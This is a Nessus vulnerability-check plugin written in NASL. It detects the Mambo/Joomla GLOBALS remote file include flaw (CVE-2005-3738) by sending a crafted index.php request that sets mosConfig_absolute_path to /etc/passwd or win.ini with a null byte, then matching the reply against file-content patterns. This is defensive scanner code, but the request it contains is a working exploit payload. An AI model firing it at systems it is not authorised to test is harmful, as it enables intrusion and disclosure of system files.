#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(20222);
  script_version("$Revision: 1.22 $");
  script_cvs_date("$Date: 2017/05/19 13:58:07 $");

  script_cve_id("CVE-2005-3738");
  script_bugtraq_id(15461);
  script_osvdb_id(20915);
  script_xref(name:"EDB-ID", value:"1337");

  script_name(english:"Mambo Open Source / Joomla! GLOBALS Variable Remote File Include");
  script_summary(english:"Attempts to read a file using Mambo Open Source / Joomla!.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by a
remote file include vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Mambo Open Source or Joomla! running on the remote host
is affected by a remote file include vulnerability due to allowing the
the GLOBALS variable array to be overwritten whenever the PHP
'register_globals' setting is disabled. An unauthenticated, remote
attacker can exploit this issue to disclose arbitrary files or execute
arbitrary PHP code on the remote host, subject to the privileges of
the web server user ID.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Nov/528");
 # https://web.archive.org/web/20060112131312/http://forum.mamboserver.com/showthread.php?t=66154
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e9263098");
 # http://web.archive.org/web/20080730055057/http://www.joomla.org/content/view/498/74/
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?835328a5");
  script_set_attribute(attribute:"solution", value:
"If using Mambo Open Source, apply the patch from the vendor. If using
Joomla!, upgrade to version 1.0.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/11/16");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/11/17");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:joomla:joomla\!");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

port = get_http_port(default:80,  php:TRUE);
app = "Mambo / Joomla!";

# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item("www/" +port+ "/mambo_mos");
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
joomla_installs = get_installs(
  app_name : "Joomla!",
  port     : port
);

if (joomla_installs[0] == IF_OK)
{
  foreach install (joomla_installs[1])
  {
    dir = install['path'];
    dirs[ndirs++] = dir;
  }
}
if (max_index(dirs) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, app, port);

# Try to retrieve a local file.
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os)
    files = make_list('/windows/win.ini','/winnt/win.ini');
  else
    files = make_list('/etc/passwd');
}
else files = make_list('/etc/passwd', '/windows/win.ini', '/winnt/win.ini', 'LICENSE.php');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['LICENSE.php'] = "GNU GENERAL PUBLIC LICENSE";

non_affect = make_list();

# Loop through each directory.
foreach dir (list_uniq(dirs))
{
  foreach file (files)
  {
    url = "/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=" + file + "%00";
    # This particular attack requires magic_quotes_gpc be disabled.
    w = http_send_recv3(
      method : "GET",
      item   : dir + url,
      port   : port,
      exit_on_fail : TRUE
    );
    res = w[2];

    # There's a problem if...
    if (
      # we're being paranoid and got nothing back (eg, magic_quotes_gpc
      # was enabled and display_errors was disabled) or...
      (report_paranoia > 1 && isnull(res)) ||

      (
        # we got a response and...
        !isnull(res) &&
        (
          # there's an entry for root or...
          egrep(string:res, pattern:file_pats[file]) ||
          # we get an error saying "failed to open stream" or "Failed opening".
          #
          # this suggests magic_quotes_gpc was enabled but remote URLs
          # might still work.
          egrep(string:res, pattern:"Warning.+main\(.+failed to open stream") ||
          "Failed opening required" >< res || "open_basedir restriction in effect. File(" >< res
        )
      )
    )
    {
      if (!isnull(res))
      {
        contents = strstr(res, '<div class="content_outline">');
        if (contents)
        {
          contents = strstr(contents, ">") - ">";
          if (contents) contents = contents - strstr(contents, "<");
          if (contents) contents = ereg_replace(pattern:"^[^a-z_]+", replace:"", string:contents);
        }
        # with Joomla, the contents are between the final "</div>" and "</body>"
        else
        {
          contents = res - strstr(res, "</body>");
          while (contents && "</div>" >< contents)
            contents = strstr(contents, "</div>") - "</div>";
        }
      }

      if (empty_or_null(contents))
        contents = "An error message found in the response suggests that the application is affected.";
      security_report_v4(
        port        : port,
        severity    : SECURITY_WARNING,
        file        : file,
        request     : make_list(build_url(qs:dir + url, port:port)),
        output      : contents,
        attach_type : 'text/plain'
      );
      exit(0);
    }
  }
  non_affect = make_list(non_affect, dir);
}
installs = max_index(non_affect);

if (installs == 0)
  exit(0, "None of the "+app+ " installs (" + join(dirs, sep:" & ") + ") on port " + port+ " are affected.");

else if (installs == 1)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

else exit(0, "None of the "+app+ " installs (" + join(non_affect, sep:" & ") + ") on port " + port + " are affected.");
